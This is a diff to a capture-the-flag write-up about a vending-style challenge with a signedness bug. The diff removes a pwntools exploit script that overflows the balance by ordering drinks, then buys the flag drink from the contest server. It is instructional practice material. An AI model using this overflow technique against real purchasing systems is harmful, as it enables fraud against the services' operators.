@@ -41,26 +41,7 @@ The flaw is a **Signedness Bug**. The variables are stored as unsigned integers,
 ## 4. Exploit Script
 The exploit was written using the `pwntools` library in Python.
 
-```python
-from pwn import *
 
-# Establish connection
-r = remote('malta.ctf.pascalctf.it', 9001)
-
-# Step 1: Trigger Integer Overflow to gain money
-log.info("Triggering Integer Overflow...")
-r.sendlineafter(b"Select a drink: ", b"10")
-r.sendlineafter(b"How many drinks do you want? ", b"3")
-
-# Step 2: Purchase the Flag drink (now that we are rich)
-log.info("Purchasing the Flag...")
-r.sendlineafter(b"Select a drink: ", b"10")
-r.sendlineafter(b"How many drinks do you want? ", b"1")
-
-# Step 3: Exit and capture the flag output
-r.sendlineafter(b"Select a drink: ", b"11")
-print(r.recvall().decode())
-```
 ## 5.Result 
 # 0x06: Result
 ![PoC](./screenshot.jpg)
